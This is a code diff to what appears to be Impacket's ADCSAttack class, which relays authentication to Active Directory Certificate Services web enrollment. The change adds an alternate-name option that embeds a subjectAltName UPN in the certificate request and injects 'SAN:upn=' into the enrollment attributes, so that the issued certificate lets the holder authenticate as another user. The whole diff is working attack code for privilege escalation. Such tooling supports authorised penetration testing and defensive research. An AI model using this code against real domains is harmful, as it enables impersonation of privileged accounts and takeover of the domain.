@@ -1,6 +1,6 @@
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# SECUREAUTH LABS. Copyright (C) 2018 SecureAuth Corporation. All rights reserved.
+# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -37,11 +37,13 @@ class ADCSAttack:
         if current_template is None:
             current_template = "Machine" if self.username.endswith("$") else "User"
 
-        csr = self.generate_csr(key, self.username)
+        csr = self.generate_csr(key, self.username, self.config.altName)
         csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
         LOG.info("CSR generated!")
 
-        data = "Mode=newreq&CertRequest=%s&CertAttrib=CertificateTemplate:%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, current_template)
+        certAttrib = self.generate_certattributes(current_template, self.config.altName)
+
+        data = "Mode=newreq&CertRequest=%s&CertAttrib=%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, certAttrib)
 
         headers = {
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
@@ -76,10 +78,18 @@ class ADCSAttack:
         certificate_store = self.generate_pfx(key, certificate)
         LOG.info("Base64 certificate of user %s: \n%s" % (self.username, base64.b64encode(certificate_store).decode()))
 
-    def generate_csr(self, key, CN):
+        if self.config.altName:
+            LOG.info("This certificate can also be used for user : {}".format(self.config.altName))
+
+    def generate_csr(self, key, CN, altName):
         LOG.info("Generating CSR...")
         req = crypto.X509Req()
         req.get_subject().CN = CN
+
+        if altName:
+            req.add_extensions([crypto.X509Extension(b"subjectAltName", False, b"otherName:1.3.6.1.4.1.311.20.2.3;UTF8:%b" %  altName.encode() )])
+
+
         req.set_pubkey(key)
         req.sign(key, "sha256")
 
@@ -91,3 +101,9 @@ class ADCSAttack:
         p12.set_certificate(certificate)
         p12.set_privatekey(key)
         return p12.export()
+
+    def generate_certattributes(self, template, altName):
+
+        if altName:
+            return "CertificateTemplate:{}%0d%0aSAN:upn={}".format(template, altName)
+        return "CertificateTemplate:{}".format(template)
